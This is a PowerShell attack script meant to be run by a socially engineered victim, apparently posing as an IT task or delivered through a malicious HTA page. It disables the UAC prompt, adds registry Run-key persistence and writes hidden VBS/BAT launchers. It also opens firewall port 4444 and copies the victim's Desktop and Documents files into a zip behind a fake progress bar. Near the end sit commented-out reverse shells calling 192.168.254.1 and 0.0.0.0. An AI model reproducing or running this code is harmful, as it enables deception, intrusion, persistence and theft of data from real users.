<#
	This script when run by the target user will do a number of things
	1. run some simple commands (e.g. ipconfig /all)
	2. add a registry entry to ensure the scripts start w/priv at boot time
	3. write the bat and ps1 files we'll need to get our reboot persistence and reverse shell
		A. write vbsStart.vbs in tmp folder
		B. write the ps1 file
		C. write bat file that will execute the ps1
			i. called using vbsStart.vbs so none of the scripts run with visible pop-up windows
	4. a command is run to disable UAC if it is still enabled on the target

	This can be set up to execute in at least two ways
		1. social engineering target to run a initial script
			e.g. pretend to be IT and require this to be run for some reason or get target to click on infected HTA webpage which will execute this code

	run entire script\get immediate reverse shell and persistence via HTA
	http://9to5it.com/using-html-applications-as-a-powershell-gui/
	HTA in a webpage
	http://webreference.com/programming/HTA/index.html
	help page for HTA
	http://www.w3.org/TR/html5/dom.html#script-supporting-elements-2
#>


#############################################
###        Configuration Variables        ###
                                            #
 [cmdletbinding()] 
param (
    $DesktopPath = [Environment]::GetFolderPath("Desktop"),
    $tempDir = $env:tmp,
	$runRegKey = 'HKLM:\Software\Microsoft\Windows\CurrentVersion\Run',
    $startvbsStart = "$tempDir\startvbsStart.bat",
    $vbsStartVBS = "$tempDir\vbsStart.vbs",
    $startPowershell = "$tempDir\startPowershell.bat",
	$bypassUAC = "$tempDir\bypassUAC.ps1",
    $dropperscript = "$tempDir\dropper.ps1",
	$getPersistence = "$tempDir\Get-Persistence.ps1",
	$LogPath = "$tempDir\logs",
	$fullLogPath = "$LogPath\Get-NetInfo.log",
    $ErrorActionPreference = "SilentlyContinue",
	$userDocPath = [Environment]::GetFolderPath("MyDocuments")
)

###            function sauce              ###
#############################################
# when executed as admin this will silently disable UAC
function Simple-BypassUAC {
	Set-ItemProperty -Path REGISTRY::HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System -Name ConsentPromptBehaviorAdmin -Value 0
}

# folder for output we might want to gather from target
function Create-Folder {
        Param(
        [Parameter(Mandatory=$true)]
        [string]$LogPath   
    )

	#Delete previous content
	if (!(test-path $LogPath)) {
		new-item $LogPath -ItemType directory
	}
    else {
		Write-Host "Log folder already exists" -ForegroundColor Yellow
	}
}

# obvious logging is obvious
function Write-Log {
	param(  
	[Parameter(
		Position=0, 
		Mandatory=$true, 
		ValueFromPipeline=$true,
		ValueFromPipelineByPropertyName=$true)
	]
	
	[String]$Message,
	[ValidateSet("1","2","3")] 
	[String]$Type = "1"
	)

	Write-Host $Message -ForegroundColor Yellow
	Add-Content $fullLogPath -Value "<![LOG[$Message]LOG]!><time=`"$(Get-Date -format "HH:mm:ss.000+000")`" date=`"$(Get-Date -format "MM-dd-yyyy")`" component=`"NetInfo`" context=`"`" type=`"$Type`" thread=`"`" file=`"Get-NetInfo`">"
}

# gather some info from target (in this case would be seen by target user by design as part of a possible social engineering strategy
function Get-NetInfo {
	[string]$getInterface = Get-NetIPAddress | Sort InterfaceIndex | select -ExpandProperty InterfaceIndex
	Write-Log $getInterface
	Start-Sleep 1
	[string]$getIfaceAlias = Get-NetIPAddress | Sort InterfaceIndex | select -ExpandProperty InterfaceAlias
	Write-Log $getIfaceAlias
	Start-Sleep 1
	[string]$getAddressFam = Get-NetIPAddress | Sort InterfaceIndex | select -ExpandProperty AddressFamily
	Write-Log $getAddressFam
	Start-Sleep 1
	[string]$getIPAddress = Get-NetIPAddress | Sort InterfaceIndex | select -ExpandProperty IPAddress
	Write-Log $getIPAddress
	Start-Sleep 1
	[string]$getLength = Get-NetIPAddress | Sort InterfaceIndex | select -ExpandProperty PrefixLength
	Write-Log $getLength
	Start-Sleep 1
	[string]$getNetConnection = Test-NetConnection -ComputerName www.microsoft.com -InformationLevel Detailed
	Write-Log $getNetConnection
	Start-Sleep 1
}
	
# here powershell is writing the files needed to actually run the deeper level powershell actions as well as creating the hidden persistence on the target
function Create-Files {
@'
command = "powershell.exe -nologo -command C:\Users\ADMINI~1\AppData\Local\Temp\Get-Persistence.ps1"
 set shell = CreateObject("WScript.Shell")
 shell.Run command,0
'@ | Out-File $vbsStartVBS -Encoding oem

@'
start-process notepad
'@ | Out-File $getPersistence -Encoding oem

<#
@'
wscript.exe "C:\Users\ADMINI~1\AppData\Local\Temp\vbsStart.vbs" "C:\Users\ADMINI~1\AppData\Local\Temp\startPowershell.bat"
'@ | Out-File $startvbsStart -Encoding oem
#>

@'
REM powershell -ExecutionPolicy Bypass -File Get-Persistence.ps1 -Verb RunAs"
REM powershell.exe -Command "Start-Process cmd -ArgumentList '/k powershell C:\Users\ADMINI~1\AppData\Local\Temp\Get-Persistence.ps1' -Verb RunAs"
powershell.exe (Get-Process).Count | Out-File c:\temp\output.txt -Encoding ascii
'@ | Out-File $startPowershell -Encoding oem

}

# collect items of interest from target and put them in a zip
function Add-ToZip {
	If(Test-path "$LogPath\logs.zip") {Remove-item "$LogPath\logs.zip"}
	Add-Type -assembly "system.io.compression.filesystem"
	[io.compression.zipfile]::CreateFromDirectory($LogPath, "$LogPath\logs.zip")
}
	
# copy zip file where we need it to be
function Invoke-Robocopy {
	# use this to copy logs somewhere and maybe steal some interesting default files from the target
	# this is still the initial phase keeping the target happy that something expected is happening while rooting them
	# you can do what you want here or do nothing in the case of running this from an infected HTA webpage and remain hidden all along
	robocopy $DesktopPath $LogPath *.* | %{$data = $_.Split([char]9); if("$($data[4])" -ne "") { $file = "$($data[4])"} ;Write-Progress "Percentage $($data[0])"  -Activity "Robocopy" -CurrentOperation "$($file)"  -ErrorAction SilentlyContinue; }
	robocopy $userDocPath $LogPath *.* | %{$data = $_.Split([char]9); if("$($data[4])" -ne "") { $file = "$($data[4])"} ;Write-Progress "Percentage $($data[0])"  -Activity "Robocopy" -CurrentOperation "$($file)"  -ErrorAction SilentlyContinue; }
}

# give user choice of reboot or shutdown either way we will have shell when they are back up and running
function Invoke-RebootPrompt {
	$caption = "Choose Action"
	$message = "Restart or shutdown?"
	$restart = new-Object System.Management.Automation.Host.ChoiceDescription "&Restart","Restart"
	$shutdown = new-Object System.Management.Automation.Host.ChoiceDescription "&Shutdown","Shutdown"
	$choices = [System.Management.Automation.Host.ChoiceDescription[]]($restart,$shutdown)
	$answer = $host.ui.PromptForChoice($caption,$message,$choices,0)

	switch ($answer){
		0 {Restart-Computer}
		1 {Stop-Computer}
	}
}

function Get-OpenPorts {
	$port = New-Object-ComObject HNetCfg.FWOpenPort
	$port.Port = 4444
	$fwMgr= New-Object-ComObject HNetCfg.FwMgr
	$profile=$fwMgr.LocalPolicy.CurrentProfile
	$profile.GloballyOpenPorts.Add($port)
}
#############################################
###           end function sauce          ###

###             secret sauce              ###
#############################################
<#
REM CreateObject("Wscript.Shell").Run """" & WScript.Arguments(0) & """", 0, False
    this is the part where we hack the gibson you !@#$$
	more accurately where we write the file written by the main script executed by the target user
    and the path to this file added to the registry so it will run as system at reboot so this is where 
	we get shell...hopefully every time they reboot for a while at least
# cmd.exe /c start cmd /k echo "hello"
#>

#############################################
###           end secret sauce            ###


###             set-up sauce              ###
#############################################

	Set-ExecutionPolicy -ExecutionPolicy Unrestricted -Force
	Simple-BypassUAC
	New-ItemProperty -Path $runRegKey -Name "dropperScript" -Value $vbsStartVBS -Force
	Create-Files

#############################################
###           end set-up sauce            ###

###            starter sauce              ###
#############################################
<#
	this is the part where the user has executed
	things are written and hidden some output shown
	to satisfy the user that things are kosher
	even though we may be making copies of their shit 
	to download for ourselves later
#>
	Get-NetInfo
	Get-OpenPorts
	Invoke-Robocopy
	for ($a=1; $a -le 100; $a++) {
		Write-Progress -Activity "Working... " -PercentComplete $a -CurrentOperation "$a complete" -Status "Please Wait"; Add-ToZip
	}
	Invoke-RebootPrompt

#############################################
###           end starter sauce           ###


<#
    this will be used to execute the .bat file to kick off the powershell script invisibly to the target user
	when the script is run and each time the target machine is rebooted:
--------------------------------------------------------------
this will start the execution of scripts invisibly to the user 
	name it what you want --> vbsStart.vbs
    CreateObject("Wscript.Shell").Run """" & WScript.Arguments(0) & """", 0, False
======================================================
To access list of arguments use only two double quotes
    CreateObject("Wscript.Shell").Run "" & WScript.Arguments(0) & "", 0, False

start the .bat that starts the ps1 invisibly to user we write this file:
    wscript.exe "$tempDir\startvbsStart.bat" "$tempDir\startPowershell.bat"

#>

#A simple and small reverse shell. Options and help removed to save space. 
#Uncomment and change the hardcoded IP address and port number in the below line. Remove all help comments as well.
#$client = New-Object System.Net.Sockets.TCPClient('192.168.254.1',4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
#$sm = (New-Object Net.Sockets.TCPClient('192.168.254.1',55555)).GetStream();[byte[]]$bt=0..65535|%{0};while(($i=$sm.Read($bt,0,$bt.Length)) -ne 0){;$d=(New-Object Text.ASCIIEncoding).GetString($bt,0,$i);$st=([text.encoding]::ASCII).GetBytes((iex $d 2>&1));$sm.Write($st,0,$st.Length)}



<#
# there are plenty of reverse shell ideas out there this is one i will test with
# i found this on the internet a while ago but don't remember where
 while (1 -eq 1)
{
    $ErrorActionPreference = 'Continue';
    try
    {
        #attempt inital connection
        $client = New-Object System.Net.Sockets.TCPClient("0.0.0.0",4444);
        $stream = $client.GetStream();
        [byte[]]$bytes = 0..255|%{0};
        $sendbytes = ([text.encoding]::ASCII).GetBytes("Client Connected..."+"`n`n" + "PS " + (pwd).Path + "> ");
        $stream.Write($sendbytes,0,$sendbytes.Length);$stream.Flush();
        while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0)
        {
            $recdata = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);
            if($recdata.StartsWith("kill-link")){ cls; $client.Close(); exit;}
            try
            {
                #attempt to execute the received command
                $sendback = (iex $recdata 2>&1 | Out-String );
                $sendback2  = $sendback + "PS " + (pwd).Path + "> ";
            }
            catch
            {
                $error[0].ToString() + $error[0].InvocationInfo.PositionMessage;
                $sendback2  =  "ERROR: " + $error[0].ToString() + "`n`n" + "PS " + (pwd).Path + "> ";
                cls;
            }
            $returnbytes = ([text.encoding]::ASCII).GetBytes($sendback2);
            $stream.Write($returnbytes,0,$returnbytes.Length);$stream.Flush();          
        }
    }
    catch 
    {
        #an initial connection error - close and wait 30 secs then retry
        if($client.Connected)
        {
            $client.Close();
        }
        cls;
        Start-Sleep -s 30;
    }     
}
#>


